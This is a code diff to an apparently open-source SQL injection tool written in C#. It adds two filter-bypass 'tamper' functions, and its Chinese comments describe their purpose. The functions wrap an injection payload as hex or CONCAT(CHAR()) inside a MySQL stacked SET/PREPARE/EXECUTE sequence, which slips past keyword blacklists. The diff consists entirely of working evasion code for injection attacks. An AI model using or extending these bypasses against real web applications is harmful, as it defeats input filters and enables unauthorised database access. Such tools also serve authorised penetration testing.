@@ -16,7 +16,7 @@ namespace SuperSQLInjectionV2.Bypass
     }
 
     /// <summary>
-    /// 内置tamper库（移植自tamper，共31个）：
+    /// 内置tamper库（移植自tamper，共33个）：
     /// 内置项在编码处理页以"内置"标识展示（不可编辑代码，可启停/删除），执行时直接走C#委托不经过QuickJS。
     /// </summary>
     public static class BuiltinTampers
@@ -83,6 +83,10 @@ namespace SuperSQLInjectionV2.Bypass
             Reg("space2randomblank", "空格→随机空白符（空格/Tab/LF/CR/VT/FF）", Space2RandomBlank);
             Reg("space2mssqlblank", "空格→随机控制符%01-%1F（MSSQL视为空白）", Space2MssqlBlank);
             Reg("randomcomments", "SQL关键字内部随机插入内联注释（SELECT→S/**/ELECT）", RandomComments);
+
+            //---- 语句级重写类（堆叠注入专用：整段逃逸关键字黑名单）----
+            Reg("hexprepare", "整段SQL转hex套MySQL预编译执行（;SET @s=0x..;PREPARE..;EXECUTE..，堆叠通道专用，逃逸select等关键字整串过滤）", HexPrepare);
+            Reg("hexpreparechar", "hexprepare的char()变体（0x被过滤时改用CONCAT(CHAR(..),..)拼接，堆叠通道专用）", HexPrepareChar);
 
             return d;
         }
@@ -320,6 +324,40 @@ namespace SuperSQLInjectionV2.Bypass
                 ret = Regex.Replace(ret, @"\b" + kw + @"\b", m => "/*!0" + m.Value, RegexOptions.IgnoreCase);
             }
             return ret;
+        }
+
+        //---- hexprepare 系列：语句级重写，整段逃逸关键字整串过滤（preg_match黑名单场景） ----
+
+        /// <summary>payload → ;SET @s=0x{hex};PREPARE stmt FROM @s;EXECUTE stmt;（MySQL堆叠专用）</summary>
+        private static string HexPrepare(string payload)
+        {
+            byte[] bytes = Encoding.UTF8.GetBytes(payload);
+            StringBuilder hex = new StringBuilder(bytes.Length * 2 + 64);
+            hex.Append(";SET @s=0x");
+            foreach (byte b in bytes)
+            {
+                hex.Append(b.ToString("x2"));
+            }
+            hex.Append(";PREPARE stmt FROM @s;EXECUTE stmt;");
+            return hex.ToString();
+        }
+
+        /// <summary>hexprepare 的 char() 变体：0x 被过滤时用 CONCAT(CHAR(n),...) 拼接</summary>
+        private static string HexPrepareChar(string payload)
+        {
+            byte[] bytes = Encoding.UTF8.GetBytes(payload);
+            StringBuilder sb = new StringBuilder(bytes.Length * 8 + 64);
+            sb.Append(";SET @s=CONCAT(");
+            for (int i = 0; i < bytes.Length; i++)
+            {
+                if (i > 0)
+                {
+                    sb.Append(',');
+                }
+                sb.Append("CHAR(").Append(bytes[i]).Append(')');
+            }
+            sb.Append(");PREPARE stmt FROM @s;EXECUTE stmt;");
+            return sb.ToString();
         }
     }
 }
